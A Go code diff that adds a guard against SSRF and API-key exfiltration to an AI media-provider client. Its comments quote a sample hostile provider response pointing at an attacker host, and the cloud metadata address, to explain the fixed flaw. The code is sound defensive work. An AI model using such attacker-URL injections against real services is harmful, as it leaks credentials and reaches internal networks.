@@ -7,7 +7,10 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
+	"net/url"
+	"os"
 	"strings"
 )
 
@@ -90,6 +93,162 @@ func authHeaders(req *http.Request, cfg Config, anthropic bool) {
 		return
 	}
 	req.Header.Set("Authorization", "Bearer "+cfg.APIKey)
+}
+
+// ---- the SSRF guard (F-08 / GH#86) -----------------------------------------
+//
+// EVERY URL IN THIS FILE COMES FROM ONE OF TWO PLACES, and they are not equally
+// trustworthy:
+//
+//   - DERIVED from the admin-configured base URL (joinURL(cfg.MusicBaseURL, …)).
+//     An operator with the admin role typed that; validURL already bounded it.
+//   - HANDED BACK BY THE PROVIDER, inside its JSON: Replicate's `urls.get`,
+//     `output`, Suno's `audio_url`, OpenAI's image `url`. These are ATTACKER
+//     DATA the moment the provider is malicious, compromised, or merely hosting
+//     an open redirect — and we followed them with no checks at all.
+//
+// Two distinct things went wrong with the second kind:
+//
+//  1. KEY EXFILTRATION. getRaw attaches `Authorization: Bearer <key>` /
+//     `x-api-key` unconditionally, and the music poll loop points it at
+//     `urls.get` straight out of the create response. `{"urls":{"get":
+//     "http://attacker/"}}` and the server-side provider key is delivered to
+//     the attacker, once per poll.
+//  2. SSRF. The keyless asset fetches (audio/image) would happily GET
+//     `http://169.254.169.254/latest/meta-data/` or any service on this box,
+//     turning the platform into a jump host into its own network.
+//
+// guardProviderURL is the ONE place both are refused, and all three followers
+// (getRaw / fetchAudioBytes / fetchImageBytes) must go through it.
+//
+// THE POLICY IS RELATIVE TO THE CONFIGURED PROVIDER, not an absolute blocklist,
+// because an absolute one is wrong in both directions:
+//
+//   - a real delivery host is a DIFFERENT host from the API host (Replicate
+//     delivers from a CDN, OpenAI from blob storage), so "same host only" would
+//     break every working install; and
+//   - a self-hosted provider on the LAN — the reason validURL still allows
+//     http:// — is legitimately on a private address, so "never touch private
+//     space" would break that one.
+//
+// So: the key may only go to the configured provider's own domain, and a fetch
+// may not reach a network zone the configured provider is not already in.
+//
+// ⚠️ KNOWN RESIDUAL, written down rather than papered over (第三守則): the zone
+// check resolves the name here, and the http client resolves it again when it
+// dials, so a hostile DNS server that answers differently the second time (DNS
+// rebinding) is not covered. Closing that needs a dial-time hook on the
+// transport; the key-exfiltration half above is NAME-based and is not affected.
+
+// allowPrivateFetchEnv is the one-switch rollback (第〇·六守則: 不能停的時候做成
+// 開關). Set it to 1 and provider-returned URLs may reach private space again —
+// the deployment that needs it is a self-hosted provider whose delivery host is
+// a *different* private host from its API host.
+const allowPrivateFetchEnv = "GGD_AI_ALLOW_PRIVATE_FETCH"
+
+func allowPrivateFetch() bool {
+	v := strings.TrimSpace(strings.ToLower(os.Getenv(allowPrivateFetchEnv)))
+	return v == "1" || v == "true"
+}
+
+// registrableish is a deliberately crude eTLD+1: the last two labels of a name.
+// It is used ONLY to decide whether a poll URL is still "the provider we
+// configured" (api.replicate.com ↔ replicate.com), never to grant anything, and
+// a crude answer here is conservative in the safe direction — it accepts fewer
+// hosts than a real public-suffix list would, not more. (golang.org/x/net's
+// publicsuffix would be exact, but it is an INDIRECT dependency of this module
+// and promoting it for one string comparison is not worth the go.mod churn.)
+func registrableish(host string) string {
+	labels := strings.Split(strings.Trim(strings.ToLower(host), "."), ".")
+	if len(labels) < 2 {
+		return strings.ToLower(host)
+	}
+	return strings.Join(labels[len(labels)-2:], ".")
+}
+
+// sameProviderDomain reports that `target` is the configured provider host or a
+// sibling under the same registrable domain. IP literals must match exactly:
+// two addresses under "the same domain" is not a meaningful idea.
+func sameProviderDomain(target, base string) bool {
+	if strings.EqualFold(target, base) {
+		return true
+	}
+	if net.ParseIP(target) != nil || net.ParseIP(base) != nil {
+		return false
+	}
+	t := registrableish(target)
+	return t != "" && t == registrableish(base)
+}
+
+// privateAddr reports an address that is not routable on the public internet:
+// loopback, RFC1918/ULA, link-local (169.254.169.254 — the cloud metadata
+// endpoint — lands here), the unspecified address, and multicast.
+func privateAddr(ip net.IP) bool {
+	return ip.IsLoopback() || ip.IsPrivate() || ip.IsUnspecified() ||
+		ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() ||
+		ip.IsInterfaceLocalMulticast() || ip.IsMulticast()
+}
+
+// hostIsPrivate reports whether `host` names private space. A name that cannot
+// be resolved reports false: an unresolvable host cannot be FETCHED either, so
+// failing closed here would only turn transient DNS trouble into a hard outage
+// while blocking nothing a dial would not block anyway.
+func hostIsPrivate(ctx context.Context, host string) bool {
+	if ip := net.ParseIP(host); ip != nil {
+		return privateAddr(ip)
+	}
+	addrs, err := net.DefaultResolver.LookupIPAddr(ctx, host)
+	if err != nil {
+		return false
+	}
+	// ANY private answer is enough: the dialer may pick that one.
+	for _, a := range addrs {
+		if privateAddr(a.IP) {
+			return true
+		}
+	}
+	return false
+}
+
+// guardProviderURL decides whether `raw` — a URL the PROVIDER chose — may be
+// fetched, given the admin-configured `base` for that capability. carriesKey is
+// true when the server-side API key rides along on the request.
+//
+// Errors are provider-shaped (a clean 502 upstream) and name only the host, so
+// nothing here can echo a token into a log line.
+func guardProviderURL(ctx context.Context, raw, base string, carriesKey bool) error {
+	u, err := url.Parse(strings.TrimSpace(raw))
+	if err != nil || !u.IsAbs() || u.Hostname() == "" {
+		return provErr("provider returned an unusable URL")
+	}
+	if u.Scheme != "http" && u.Scheme != "https" {
+		return provErr("provider returned a %q URL; only http(s) is followed", u.Scheme)
+	}
+	b, err := url.Parse(strings.TrimSpace(base))
+	if err != nil || b.Hostname() == "" {
+		return provErr("no configured provider host to check the URL against")
+	}
+	// No silent downgrade: a provider configured over TLS may not send us to a
+	// cleartext host, where the bytes (and, for a poll, the key) are readable.
+	if b.Scheme == "https" && u.Scheme != "https" {
+		return provErr("refusing to follow a cleartext URL from an https provider")
+	}
+	if carriesKey && !sameProviderDomain(u.Hostname(), b.Hostname()) {
+		return provErr("refusing to send the provider key to %s", u.Hostname())
+	}
+	if allowPrivateFetch() {
+		return nil
+	}
+	// A provider that is itself on the private side (a self-hosted/LAN endpoint,
+	// or a test server) is allowed to hand back private URLs: that zone is where
+	// it lives. A PUBLIC provider pointing us inward is the attack.
+	if hostIsPrivate(ctx, b.Hostname()) {
+		return nil
+	}
+	if hostIsPrivate(ctx, u.Hostname()) {
+		return provErr("refusing to fetch %s: it resolves inside this network", u.Hostname())
+	}
+	return nil
 }
 
 // doJSON posts body to url with the provider auth headers and decodes the JSON
@@ -181,7 +340,15 @@ func (s *Service) postRaw(ctx context.Context, client *http.Client, url string, 
 // getRaw GETs url WITH the provider auth headers and returns the raw response
 // bytes. Async music providers require the key on the poll endpoint (it is the
 // same API host as create); the key is attached here and never logged.
-func (s *Service) getRaw(ctx context.Context, client *http.Client, url string, cfg Config, anthropic bool) ([]byte, error) {
+//
+// `base` is the admin-configured base URL this poll belongs to. It is a
+// REQUIRED argument, not an option: `url` here comes out of the provider's own
+// JSON, and without the guard this function is a one-request key exfiltrator
+// (GH#86). carriesKey is true, so the URL must stay on the provider's domain.
+func (s *Service) getRaw(ctx context.Context, client *http.Client, url, base string, cfg Config, anthropic bool) ([]byte, error) {
+	if err := guardProviderURL(ctx, url, base, true); err != nil {
+		return nil, err
+	}
 	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
 	if err != nil {
 		return nil, provErr("build request: %v", err)
@@ -202,8 +369,12 @@ func (s *Service) getRaw(ctx context.Context, client *http.Client, url string, c
 // fetchAudioBytes GETs the finished track a provider returned by reference. Like
 // fetchImageBytes it attaches NO auth header: this is a pre-signed delivery URL
 // from the provider's own JSON, not an API call, and the key must never leave
-// the provider host.
-func (s *Service) fetchAudioBytes(ctx context.Context, client *http.Client, url string) ([]byte, error) {
+// the provider host. `base` is the configured music base URL — the delivery host
+// is allowed to differ from it, but not to point back inside our network (GH#86).
+func (s *Service) fetchAudioBytes(ctx context.Context, client *http.Client, url, base string) ([]byte, error) {
+	if err := guardProviderURL(ctx, url, base, false); err != nil {
+		return nil, err
+	}
 	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
 	if err != nil {
 		return nil, provErr("build audio fetch: %v", err)
@@ -281,7 +452,11 @@ func imageRequestSize(model string, size int) string {
 // fetchImageBytes GETs an image the provider returned by reference. No auth
 // header is attached: this is a pre-signed URL from the provider's own JSON
 // response, not an API call, and the key must never leave the provider host.
-func (s *Service) fetchImageBytes(ctx context.Context, url string) ([]byte, error) {
+// `base` is the configured image base URL; see guardProviderURL (GH#86).
+func (s *Service) fetchImageBytes(ctx context.Context, url, base string) ([]byte, error) {
+	if err := guardProviderURL(ctx, url, base, false); err != nil {
+		return nil, err
+	}
 	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
 	if err != nil {
 		return nil, provErr("build image fetch: %v", err)
@@ -332,7 +507,7 @@ func (s *Service) generateImagePNG(ctx context.Context, cfg Config, prompt strin
 		return raw, nil
 	}
 	if href := out.Data[0].URL; href != "" {
-		return s.fetchImageBytes(ctx, href)
+		return s.fetchImageBytes(ctx, href, cfg.ImageBaseURL)
 	}
 	return nil, provErr("provider returned no image data")
 }
